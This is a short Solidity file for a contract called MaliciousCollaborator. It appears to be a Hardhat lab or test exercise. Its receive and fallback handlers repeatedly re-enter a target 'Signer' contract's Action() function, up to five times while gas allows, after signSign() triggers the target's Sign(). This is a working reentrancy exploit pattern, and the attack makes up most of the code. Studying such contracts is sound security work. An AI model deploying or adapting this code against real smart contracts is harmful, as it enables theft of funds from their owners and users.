//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Signer{
    function Sign() external;
    function Action() external;
}

contract MaliciousCollaborator {
    address owner;

    uint redirections = 0;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    receive() external payable{
        if(msg.sender != owner && redirections < 5 && gasleft()> 10000){
            Signer signer = Signer(msg.sender);
            redirections++;
            console.log(redirections);
            signer.Action();
        }
        else{
            redirections =0;
        }
    }

    fallback() external payable{
        if(msg.sender != owner && redirections < 5 && gasleft()> 10000){
            Signer signer = Signer(msg.sender);
            redirections++;
            console.log(redirections);
            signer.Action();
        }
        else{
            redirections =0;
        }
    }

    function signSign(address addr) public{
        console.log(toAsciiString(addr));
        console.log("startSignment");
        Signer signer = Signer(addr);
        console.log("2nd");
        signer.Sign();
        console.log("3rd");
//        bytes memory payload = abi.encodeWithSignature("Sign");
//        console.log("2nd");
//        (bool success, bytes memory returnData) = address(addr).call(payload);
//        if(success){
//            console.log("3rd success");
//        }
//        else{
//            console.log("3rd fail");
//        }
//        console.log(string(returnData));
    }

    function toAsciiString(address x) internal view returns (string memory) {
        bytes memory s = new bytes(40);
        for (uint i = 0; i < 20; i++) {
        bytes1 b = bytes1(uint8(uint(uint160(x)) / (2**(8*(19 - i)))));
        bytes1 hi = bytes1(uint8(b) / 16);
        bytes1 lo = bytes1(uint8(b) - 16 * uint8(hi));
        s[2*i] = char(hi);
        s[2*i+1] = char(lo);
        }
        return string(s);
    }

    function char(bytes1 b) internal view returns (bytes1 c) {
        if (uint8(b) < 10) return bytes1(uint8(b) + 0x30);
        else return bytes1(uint8(b) + 0x57);
    }
}
